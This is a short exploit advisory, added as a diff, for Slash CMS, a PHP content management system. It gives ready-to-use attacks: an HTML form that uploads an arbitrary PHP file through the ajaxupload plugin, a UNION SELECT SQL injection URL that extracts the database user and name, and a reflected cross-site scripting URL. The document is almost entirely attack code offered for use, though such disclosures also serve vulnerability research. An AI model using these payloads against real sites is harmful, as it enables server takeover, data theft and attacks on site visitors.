@@ -1,0 +1,21 @@
+##########################################
+[~] Exploit Title: Slash CMS Multiple Vulnerabilities
+[~] Date: 21-03-2013
+[~] Author: DaOne aka Mocking Bird
+[~] Vendor Homepage: http://www.slash-cms.com/
+[~] Software Link: http://sourceforge.net/projects/slashcms/
+[~] Category: webapps/php
+[~] Google Dork: "N/A"
+[~] Tested on: Apache/2.2.8(Win32) PHP/5.2.6
+##########################################
+
+# File Upload:
+<form action="http://localhost/slash-cms/core/plugins/ajaxupload/ajaxupload.php" method="post" enctype="multipart/form-data">
+<input type="file" name="sl_userfile">
+<input type="submit" value="Upload"></form>
+Uploaded File Path: /tmp/{Filename}.php
+
+
+# XSS / SQL Injection:
+http://localhost/slash-cms/index.php?mod=sl_pages&id=-2+union+select+1,2,user(),database(),5,6
+http://localhost/slash-cms/index.php?mod=sl_pages&id=<script>alert(1)</script>
